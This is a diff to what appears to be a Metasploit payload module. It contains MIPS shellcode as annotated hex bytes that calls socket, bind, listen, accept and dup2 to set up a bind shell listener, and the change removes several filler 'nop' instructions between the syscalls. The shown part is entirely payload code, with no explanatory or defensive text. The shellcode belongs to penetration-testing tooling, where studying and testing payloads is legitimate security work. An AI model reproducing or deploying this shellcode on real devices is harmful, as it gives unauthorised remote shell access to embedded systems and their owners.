@@ -50,7 +50,6 @@ module Metasploit3
     "\xff\xff\x06\x28" + #     slti    a2,zero,-1
     "\x57\x10\x02\x24" + #     li      v0,4183 ( __NR_socket )
     "\x0c\x01\x01\x01" + #     syscall
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
     "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
     "\xef\xff\x0e\x24" + #     li      t6,-17
     "\x27\x70\xc0\x01" + #     nor     t6,t6,zero
@@ -69,35 +68,29 @@ module Metasploit3
     "\xe0\xff\xa5\x23" + #     addi    a1,sp,-32
     "\x49\x10\x02\x24" + #     li      v0,4169 ( __NR_bind )A
     "\x0c\x01\x01\x01" + #     syscall
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\x01\x01\x05\x24" + #     li      a1,257
     "\x4e\x10\x02\x24" + #     li      v0,4174 ( __NR_listen )
     "\x0c\x01\x01\x01" + #     syscall
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\xff\xff\x05\x28" + #     slti    a1,zero,-1
     "\xff\xff\x06\x28" + #     slti    a2,zero,-1
     "\x48\x10\x02\x24" + #     li      v0,4168 ( __NR_accept )
     "\x0c\x01\x01\x01" + #     syscall
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
     "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\xfd\xff\x0f\x24" + #     li      t7,-3
     "\x27\x28\xe0\x01" + #     nor     a1,t7,zero
     "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
     "\x0c\x01\x01\x01" + #     syscall
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\x01\x01\x05\x28" + #     slti    a1,zero,0x0101
     "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
     "\x0c\x01\x01\x01" + #     syscall
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\xff\xff\x05\x28" + #     slti    a1,zero,-1
     "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
     "\x0c\x01\x01\x01" + #     syscall
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
     "\x50\x73\x06\x24" + #     li      a2,0x7350
     "\xff\xff\xd0\x04" + # LB: bltzal  a2,LB
     "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
